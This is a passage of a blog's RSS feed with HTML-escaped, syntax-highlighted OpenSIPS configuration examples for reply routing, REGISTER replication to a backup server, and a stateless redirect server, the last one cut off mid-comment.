&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	t_relay&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;onreply_route[1]&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;log(1,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;reply came in\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;if&lt;/span&gt; ($rs&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;~&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;18[0-9]&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		log&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;provisional -- resetting negative failure\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		t_on_failure&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;0&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>replicate</title>
      <link>https://wdd.js.org/opensips/ch8/replicate/</link>
      <pubDate>Thu, 28 May 2020 10:01:28 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch8/replicate/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-makefile&#34; data-lang=&#34;makefile&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# demo script showing how to set-up usrloc replication
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# ----------- global configuration parameters ------------------------
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;log_level&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;      &lt;span style=&#34;color:#75715e&#34;&gt;# logging level (cmd line: -dddddddddd)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;log_stderror&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;yes &lt;span style=&#34;color:#75715e&#34;&gt;# (cmd line: -E)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# ------------------ module loading ----------------------------------
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#set module path
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;mpath&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/local/lib/opensips/modules/&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;db_mysql.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sl.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tm.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;maxfwd.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;usrloc.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;registrar.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;auth.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;auth_db.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# ----------------- setting module-specific parameters ---------------
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# digest generation secret; use the same in backup server;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# also, make sure that the backup server has sync&amp;#39;ed time
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;modparam(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;auth&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;secret&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;alsdkhglaksdhfkloiwr&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# -------------------------  request routing logic -------------------
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# main routing logic
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;route{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# initial sanity checks -- messages with
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# max_forwars==0, or excessively long requests&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!mf_process_maxfwd_header&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;10&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;483&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Too Many Hops&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$ml &amp;gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;513&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Message too big&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# if the request is for other domain use UsrLoc&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# (in case, it does not work, use the following command&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# with proper names and addresses in it)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_myself&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$rd&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$rm&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;REGISTER&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# verify credentials&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!www_authorize&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;foo.bar&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;subscriber&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				www_challenge&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;foo.bar&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;0&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# if ok, update contacts and ...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			save&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;location&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# ... if this REGISTER is not a replica from our&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# peer server, replicate to the peer server&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;backup_ip&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;backup.foo.bar&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;ip.resolve&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!$si&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;backup_ip&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				t_replicate&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sip:backup.foo.bar:5060&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# do whatever else appropriate for your domain&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		log&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;non-REGISTER\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>redirect</title>
      <link>https://wdd.js.org/opensips/ch8/redirect/</link>
      <pubDate>Thu, 28 May 2020 10:01:07 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch8/redirect/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-makefile&#34; data-lang=&#34;makefile&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# $Id$
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# this example shows use of ser as stateless redirect server
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# ------------------ module loading ----------------------------------
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#set module path
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;mpath&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/local/lib/opensips/modules/&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sl.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# -------------------------  request routing logic -------------------
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# main routing logic
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;route{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# for testing purposes, simply okay all REGISTERs
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$rm&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;REGISTER&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		log&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;REGISTER&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;200&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ok&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# rewrite current URI, which is always part of destination ser&lt;/span&gt;
